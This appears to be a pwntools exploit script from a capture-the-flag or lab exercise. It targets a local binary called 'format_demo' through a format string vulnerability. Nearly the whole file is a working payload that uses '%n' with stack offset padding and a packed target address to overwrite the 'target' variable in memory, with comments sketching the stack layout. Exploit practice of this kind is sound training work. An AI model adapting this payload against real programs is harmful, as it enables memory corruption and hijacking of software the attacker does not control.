from pwn import *

# ___Secret_Password_Stored_on_Stack___

# buf base at i = 18





#p64(target_addr)

buf_base = 18

p = process("./format_demo")

target_addr = p.elf.symbols["target"]

padding_entries = 6

payload = f"%200c%{buf_base + padding_entries}$n".encode()
payload = payload.ljust(8 * padding_entries)

payload += p64(target_addr)

p.sendline(payload)
p.interactive()


# --------- main
# -------- buf
# -----
# ---------
# &buf
#